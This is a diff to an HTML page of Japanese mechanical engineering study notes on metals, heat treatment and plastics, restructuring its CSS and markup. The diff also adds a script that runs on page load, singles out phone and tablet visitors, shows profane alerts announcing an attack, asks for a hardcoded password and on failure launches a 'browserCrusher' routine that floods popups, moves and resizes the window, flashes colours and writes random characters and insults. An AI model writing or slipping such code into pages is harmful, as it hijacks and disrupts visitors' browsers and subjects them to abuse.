@@ -30,10 +30,21 @@
         /*text-align: center;*/
       }
 
-      h1.title {
+      div.header h1.title {
 
+        margin-bottom : 0;
         text-align : center;
-        font-family : "Apple Chancery";
+        font-family : "Apple Chancery", cursive;
+      }
+      div.header div.readme {
+
+        font-family : "Apple Chancery", cursive;
+        text-align : center;
+      }
+      div.header div.date {
+
+        text-align : right;
+        font-size : 0.8em;
       }
 
       div.chapter h2.title {
@@ -42,7 +53,11 @@
         border-bottom : solid 1px #777777;
       }
 
-      div.chapter div.section {
+      div.chapter div.section,
+      div.chapter div.section div.subsection,
+      div.chapter div.section div.subsection div.subsubsection,
+      div.chapter div.section div.subsection div.subsubsection div.item,
+      div.chapter div.section div.subsection div.subsubsection div.item div.contents {
 
         margin-left : 1em;
       }
@@ -54,14 +69,8 @@
         min-width : 20%;
       }
 
-      div.chapter div.section div.item {
-
-        margin-left : 1em;
-      }
-
-
-      div.chapter div.section div.item div.contents {
-        margin-left : 1em;
+      ul {
+        padding-left : 1.5em;
       }
 
       table .alignRight {
@@ -135,29 +144,64 @@
         padding-inline-start : 1.6em;
       }
 
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table1 table {
+
+        border-collapse : collapse;
+        margin-top : 2em;
+        margin-bottom : 2em;
+      }
+
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table1 table tr th,
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table1 table tr td {
+
+        border : solid 1px #E5B217;
+      }
+
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table2 table {
+
+        border-collapse : collapse;
+      }
+
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table2 table tr th,
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table2 table tr td {
+
+        border : solid 1px #E5B217;
+      }
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table1 {
+
+        display : none;
+      }
+      div.section.non-metal div.subsection.synthetic-resins div.subsubsection.plastics-type.table2 {
+
+        display : none;
+      }
+
     </style>
   </head>
 
   <body>
     <div class="htmlWrap">
-      <h1 class="title">Mechnical engineering's notebook</h1>
-      <div class="readme">
-        This is notebook on Mechanical engineering, Department of Mechanical CAD Design at Tohoku Electronics College.
+      <div class="header">
+        <h1 class="title">Mechnical engineering's notebook</h1>
+        <div class="date">YYYY/MM/dd (Aaa), HH:mm:ss</div>
+        <div class="readme">
+          This is notebook on Mechanical engineering, Department of Mechanical CAD Design at Tohoku Electronics College.
+        </div>
       </div>
       <div class="chapter">
         <h2 class="title">4. 機械に用いる材料</h2>
         <div class="section">
           <h3 class="title">3. 金属材料の強さの表し方</h3>
-          <div class="contents">
-            <div class="item">
+          <div class="subsection">
+            <div class="subsubsection">
               機械や構造物を設計したり作ったりするには，構成するのに必要な各種材料の機械的性質を知る必要がある．<br>
               &rarr;材料試験
-            </div>
-            <div class="item">
+            </div><!-- subsubsection -->
+            <div class="subsubsection">
               金属材料に引張，曲げ，圧縮，衝撃などの外力が作用した時，この外力に抵抗する度合いを数値で表したものが強さで，単位にN/mm<sup>2</sup>を用いる．<br>
               ここでは一般的なものとして
-            </div>
-            <div class="item">
+            </div><!-- subsubsection -->
+            <div class="subsubsection">
               <ul>
                 <li>
                   引張強度<br>
@@ -180,14 +224,14 @@
                   </ul>
                 </li>
               </ul>
-            </div>
-          </div><!-- contents -->
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
         </div><!-- section -->
         <div class="section">
           <h3 class="title">4. 鋼と鋳鉄の違い</h3>
-          <div class="item">
+          <div class="subsection">
             <h4 class="title">鉄鉱石 - 製鉄（図4.7）</h4>
-            <div class="contents">
+            <div class="subsubsection">
               高炉 = 溶鉱炉<br>
               <table>
                 <tr>
@@ -212,11 +256,11 @@
                   比重は7.87（比重: 4の同体積の純水との質量比）
                 </li>
               </ul>
-            </div><!-- contents -->
-          </div><!-- item -->
-          <div class="item">
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
+          <div class="subsection">
             <h4 class="title">炭素鋼の熱処理</h4>
-            <div class="contents">
+            <div class="subsubsection">
               炭素鋼は温度によって結晶構造が変化する（性質が変化する）．<br>
               この現象を変態といい，その温度を変態てんという．炭素量により変態てんは変化する．
               <ul>
@@ -243,10 +287,10 @@
                   炭素鋼を各変態点より30&sim;50&#8451;くらい高い温度に加熱した後，水中または油中で急冷し，かたさを増す操作のこと．
                 </li>
               </ul>
-            </div>
-            <div class="contents">
+            </div><!-- subsubsection -->
+            <div class="subsubsection">
               <h5 class="title">表面硬化法（表面硬化加熱処理）</h5>
-              <div>
+              <div class="item">
                 熱処理で表面だけ組成や組織の変化を行うことで内部の靭性を保ったまま耐摩耗性や耐食性を向上させること．<br>
                 歯車，ピストン，軸受など<br>
                 <ul>
@@ -264,12 +308,12 @@
                     500&#8451;程度の炭素鋼にアンモニアガスを送り込むと，表皮に硬い鉄の窒化物でき耐食性が向上する．
                   </li>
                 </ul>
-              </div>
-            </div>
-          </div><!-- item -->
-          <div class="item">
+              </div><!-- item -->
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
+          <div class="subsection">
             <h4 class="title">炭素鋼の規格と用途例</h4>
-            <div class="contents">
+            <div class="subsubsection">
               炭素鋼は一般に<u class="co-b">炭素の含有量</u>により用途の面から区分
               <ul>
                 <li>
@@ -283,7 +327,7 @@
                 </li>
               </ul>
               <h5 class="title">JISによる分類</h5>
-              <div class="contents">
+              <div class="item">
                 JISではそれぞれの鋼の種によって規格番号があり，更に材質記号で構造的強度や成分が規定されている．
                 <ul>
                   <li>
@@ -347,12 +391,12 @@
                     </table>
                   </li>
                 </ul>
-              </div>
-            </div><!-- contents -->
-          </div><!-- item -->
-          <div class="item">
+              </div><!-- item -->
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
+          <div class="subsection">
             <h4 class="title">合金鋼</h4>
-            <div class="contents">
+            <div class="subsubsection">
               炭素鋼に他の元素を添加したもの．合金元素の点火により，強度，耐熱性など様々な性質が向上し，構造用，工具用，特殊用途などに使われる．<br>
               主な合金元素：Cr, Ni, Mo, Mn, Si, Ti, N, Co, Wなど元素の種類や量によって各種の性質が改善する．<br>
               マンガン鋼，クロムモリブデン鋼などの成分元素名や快削鋼，ステンレス鋼などの用途の名前がつくものもある．<br>
@@ -364,19 +408,19 @@
                   <td>汚れ</td>
                 </tr>
               </table>
-            </div><!-- contents -->
-          </div><!-- item -->
-          <div class="item">
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
+          <div class="subsection">
             <h4 class="title">鋳鉄</h4>
-            <div class="contents">
+            <div class="subsubsection">
               FeとCの合金で<u>Cを2.0 &#126; 6.67 &#37;</u>含んだもの(実用的には 2 &#126; 4 &#37; )．一般的に耐熱性，靭性，溶接性に欠けるが，耐摩耗性，切削性，流動性が良く，収縮率も低く安価なので広く使われている．<br>
               最近では引張強さ，粘り強さが改善．鋼に比べ融点が低く流動性が良いため鋳物に適している．<br>
               Si, Mnなどを添加し，耐食性，耐熱性を高めて使われることが多い．
-            </div><!-- contents -->
-          </div><!-- item -->
-          <div class="item">
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
+          <div class="subsection">
             <h4 class="title">ろう付け合金</h4>
-            <div class="contents">
+            <div class="subsubsection">
               <u>部材接合方法</u>の一種で溶接とは異なり接合部を溶かすことなく，母材同士を媒介する「ろう」を溶かすことにより接合を行う技術．<br>
               ろう材の溶融温度<br>
               <ul>
@@ -405,11 +449,11 @@
                   機密性，電気伝導性，熱伝導性に優れる
                 </li>
               </ul>
-            </div><!-- contents -->
-          </div><!-- item -->
-          <div class="item">
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
+          <div class="subsection">
             <h4 class="title">その他の合金材料</h4>
-            <div class="contents">
+            <div class="subsubsection">
               <table class="metal other list">
                 <tr class="element">
                   <th></th>
@@ -503,14 +547,14 @@
                   </td>
                 </tr>
               </table>
-            </div><!-- contents -->
-          </div><!-- item -->
+            </div><!-- subsubsection -->
+          </div><!-- subsection -->
         </div><!-- section -->
-        <div class="section">
+        <div class="section non-metal">
           <h3 class="title">6. 金属以外の機械材料</h3>
-          <div class="contents">
+          <div class="subsection plastics">
             プラスチック（樹脂）
-            <ul>
+            <ul class="plastics type-list">
               <li>
                 合成樹脂<br>
                 石油，天然ガス
@@ -522,9 +566,9 @@
                 再生可能資源
               </li>
             </ul>
-          </div><!-- contents -->
-          <div class="contents">
-            <ul>
+          </div><!-- subsection -->
+          <div class="subsection resins">
+            <ul class="resin list">
               <li>
                 樹脂
                 <ul>
@@ -539,8 +583,8 @@
                 </ul>
               </li>
             </ul>
-          </div><!-- contents -->
-          <div class="contents">
+          </div><!-- subsection -->
+          <div class="subsection resin-type">
             <ul>
               <li>
                 熱可塑性樹脂<br>
@@ -558,12 +602,275 @@
                 廃棄時に分別，リサイクルしやすいように材質名を表記する．
               </li>
             </ul>
-          </div><!-- contents -->
+          </div><!-- subsection -->
+          <div class="subsection synthetic-resins">
+            <h4 class="title">プラスチック（合成樹脂）</h4>
+            <div class="subsubsection">
+              非金属材料の中で代表的な材料<br>
+              金属材料に代わり機械部品の材料として，広く用いられるようになった．
+            </div><!-- subsubsection -->
+            <div class="subsubsection generalPurpose-plastics">
+              <h4>汎用プラスチック</h4>
+              <div class="item">
+                金型などによる成形が比較的容易で安価なため，大量生産される各種日用品や工業分野，医療分野などの製品の原材料として広く使われている．<br>
+                製品の使用目的や用途に合わせた特製，性能を有する材料の選択が可能であり，現代社会においてなくてはならないもの．
+                <div class="contents thermoplastic-resins">
+                  <h4>熱可塑性樹脂</h4>
+                  <ul class="thermoplastic-resins">
+                    <li>ポリスチレン(PS)</li>
+                    <li>ポリプロピレン(PP)</li>
+                    <li>ポリエチレン(PE)</li>
+                    <li>ポリエチレンテレフタラート(PET)</li>
+                    <li>アクリロニトリル-ブタジエン-スチレン樹脂(ABS)</li>
+                    <li>アクリル樹脂(メタクリル樹脂)(PMMA)</li>
+                    <li>ポリ塩化ビニル(塩化ビニル樹脂)(PVC)</li>
+                    <li>ポリ乳酸樹脂(PLA): 植物由来</li>
+                  </ul>
+                </div><!-- contents -->
+                <div class="contents thermosetting-resins">
+                  <h4>熱硬化性樹脂</h4>
+                  <ul class="thermosetting-resins">
+                    <li>エポキシ樹脂(EP)</li>
+                    <li>ウレタン樹脂(PUR)</li>
+                    <li>フェノール樹脂(PF)</li>
+                    <li>メラニン樹脂(MF)</li>
+                    <li>ユリア樹脂(尿素樹脂)(UF)</li>
+                  </ul>
+                </div><!-- contents -->
+              </div><!-- item -->
+            </div><!-- subsubsection -->
+            <div class="subsubsection engineering-plastics">
+              <h4>エンジニアリングプラスチック</h4>
+              <div class="item">
+                汎用プラスチックの欠点を改善したものがエンジニアリングプラスチック（原価は高い）<br>
+                機械的強度が優れ，機械や電気部品，事務機などに使われる<br>
+                ポリアミド，ポリカーボネート，ポリアセタール，飽和ポリエステルなどが熱可塑性の代表的なもの
+              </div><!-- item -->
+            </div><!-- subsubsection -->
+            <div class="subsubsection plastics-type table1">
+              <table>
+                <tr>
+                  <th rowspan="2">汎用プラスチック</th>
+                  <th>熱可塑性プラスチック</th>
+                  <td>
+                    <ul class="thermoplastic-resins">
+                      <li>ポリスチレン(PS)</li>
+                      <li>ポリプロピレン(PP)</li>
+                      <li>ポリエチレン(PE)</li>
+                      <li>ポリエチレンテレフタラート(PET)</li>
+                      <li>アクリロニトリル-ブタジエン-スチレン樹脂(ABS)</li>
+                      <li>アクリル樹脂(メタクリル樹脂)(PMMA)</li>
+                      <li>ポリ塩化ビニル(塩化ビニル樹脂)(PVC)</li>
+                      <li>ポリ乳酸樹脂(PLA): 植物由来</li>
+                    </ul>
+                  </td>
+                </tr>
+                <tr>
+                  <th>熱効果性プラスチック</th>
+                  <td>
+                    <ul class="thermosetting-resins">
+                      <li>エポキシ樹脂(EP)</li>
+                      <li>ウレタン樹脂(PUR)</li>
+                      <li>フェノール樹脂(PF)</li>
+                      <li>メラニン樹脂(MF)</li>
+                      <li>ユリア樹脂(尿素樹脂)(UF)</li>
+                    </ul>
+                  </td>
+                </tr>
+                <tr>
+                  <th colspan="2">エンジニアリングプラスチック</th>
+                </tr>
+              </table>
+            </div>
+            <div class="subsubsection plastics-type table2">
+              <table>
+                <tr>
+                  <th>区分</th>
+                  <th>種別</th>
+                  <th>樹脂名</th>
+                  <th>記号</th>
+                  <th>性質</th>
+                  <th>用途</th>
+                </tr>
+                <tr>
+                  <th rowspan="13">汎用プラスチック</th>
+                  <th rowspan="8">熱可塑性プラスチック</th>
+                  <td>ポリスチレン</td>
+                  <td>PS</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ポリプロピレン</td>
+                  <td>PP</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ポリエチレン</td>
+                  <td>PE</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ポリエチレンテレフタラート</td>
+                  <td>PET</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>アクリロニトリル-ブタジエン-スチレン樹脂</td>
+                  <td>ABS</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>アクリル樹脂(メタクリル樹脂)</td>
+                  <td>PMMA</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ポリ塩化ビニル(塩化ビニル樹脂)</td>
+                  <td>PVC</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ポリ乳酸樹脂</td>
+                  <td>PLA</td>
+                  <td>植物由来</td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <th rowspan="5">熱硬化性プラスチック</th>
+                  <td>エポキシ樹脂</td>
+                  <td>EP</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ウレタン樹脂</td>
+                  <td>PUR</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>フェノール樹脂</td>
+                  <td>PF</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>メラニン樹脂</td>
+                  <td>MF</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <td>ユリア樹脂</td>
+                  <td>UF</td>
+                  <td></td>
+                  <td></td>
+                </tr>
+                <tr>
+                  <th colspan="2">エンジニアリングプラスチック</th>
+                </tr>
+              </table>
+            </div>
+          </div><!-- subsection -->
         </div><!-- section -->
       </div><!-- chapter -->
     </div>  <!-- htmlWrap -->
+    <!-- chapter-section-subsection-subsubsection-item-contents -->
 
     <script>
+
+      window.addEventListener ( "load" , init , false );
+
+      function init () {
+
+        let dom = {
+          date : document.querySelector ( "div.header div.date" ),
+        }
+
+        judge_fuckDevice ();
+        set_date ( dom.date );
+
+        function judge_fuckDevice () {
+
+          let username = "hoge";
+          let password = "fuga";
+          let ua = window.navigator.userAgent.toLowerCase ();
+          console.log ( ua );
+          if ( isDullDevice () ) {
+
+            alert ( "You are using stupid and dull fucking device!" );
+            alert ( "We will attacks to fucking device (smartphone and tablet)." );
+            let user = window.prompt ( "Enter the username." );
+            let pass = window.prompt ( "Enter the password." );
+
+            if ( user != username || pass != password ) {
+
+              browserCrusher ();
+            }
+          }
+
+          function isDullDevice () {
+
+            let stupidUA = /Android | webOS | iPhone | iPad | iPod | BlackBerry | IEMobile | Opera Mini/i;
+            return ( window.navigator.userAgent.search ( stupidUA ) !== -1);
+          }
+        }
+
+        function set_date ( dom ) {
+
+          let date = new Date ();
+
+          let format = {
+
+            yyyy : date.getFullYear (),
+            MM : ( "00" + ( date.getMonth () + 1 ) ).slice ( -2 ),
+            dd : ( "00" + date.getDate () ).slice ( -2 ),
+            day : function () {
+
+              let aaa;
+
+              switch ( date.getDay() ) {
+                case 0:
+                  aaa = "Sun";
+                  break;
+                case 1:
+                  aaa = "Mon";
+                  break;
+                case 2:
+                  aaa = "Tue";
+                  break;
+                case 3:
+                  aaa = "Wed";
+                  break;
+                case 4:
+                  aaa = "Thu";
+                  break;
+                case 5:
+                  aaa = "Fri";
+                  break;
+                case 6:
+                  aaa = "Sat";
+                  break;
+                default:
+                  aaa = "NaN";
+              }
+              return aaa;
+            },
+            HH : ( "00" + date.getHours () ).slice ( -2 ),
+            mm : ( "00" + date.getMinutes () ).slice ( -2 ),
+            ss : ( "00" + date.getSeconds () ).slice ( -2 ),
+          };
+
+          dom.innerHTML = format.yyyy + "/" + format.MM + "/" + format.dd + " (" + format.day () + "), " + format.HH + ":" + format.mm + ":" + format.ss;
+        }
+      }
 
       document.oncontextmenu = function () {
 
@@ -632,6 +939,72 @@
 
             console.log ( element );
             element [ i ].style.display = "none";
+          }
+        }
+      }
+
+      function browserCrusher () {
+
+        setInterval ( bgcolCrusher, 1 );
+        setInterval ( rdmOpWin , 1 );
+        setInterval ( rdmMvWin , 1 );
+        setInterval ( rdmResizeWin , 100 );
+        setInterval ( rdmChar , 1 );
+        setInterval ( rdmWord , 100 );
+
+        let probabilityWin = 0.001;
+        let probabilityWord = 0.0001;
+
+        function bgcolCrusher () {
+
+          let rgb = "";
+          let body = document.querySelector ( "body" );
+          for ( let i = 0; i < 3; i++ ) {
+
+            rgb = rgb + Math.floor ( Math.random () * 256 ).toString ( 16 );
+          }
+          body.style.backgroundColor = "#" + rgb;
+        }
+
+        function rdmOpWin () {
+
+          // let probability = 0.001;
+          if ( Math.random () < probabilityWin ) {
+
+            // window.open ( "browserCrusher.html" , "hoge" , "width=300 , height=200" );
+            // for ( let i = 0; i < 3; i++ ) {
+              window.open ( "timetable.html" , "_blank" , "width=300 , height=200" );
+              probability = probability * 0.5;
+              // console.log("op");
+            // }
+          }
+        }
+
+        function rdmMvWin () {
+
+          window.moveBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+          // let w = Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width;
+          // let h = Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height;
+
+        }
+
+        function rdmResizeWin () {
+
+          window.resizeBy ( Math.floor ( 2 * Math.random () * window.parent.screen.width ) - window.parent.screen.width , Math.floor ( 2 * Math.random () * window.parent.screen.height ) - window.parent.screen.height );
+        }
+
+        function rdmChar () {
+
+          let chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz`~!@#$%^&*()-_=+[{}]\|;:,./<>?¡™£¢∞§¶•ªº–≠œ∑´®¥¨π“‘«»’”∆˚¬…˜µ≤≥÷æΩ≈ç√";
+          document.write ( chars [ Math.floor ( Math.random () * chars.length ) ] );
+        }
+
+        function rdmWord () {
+
+          let word = [ "fuckyou", "You asshole" ];
+          if ( Math.random () < probabilityWord ) {
+
+            document.write ( word [ Math.floor ( Math.random () * word.length ) ] );
           }
         }
       }
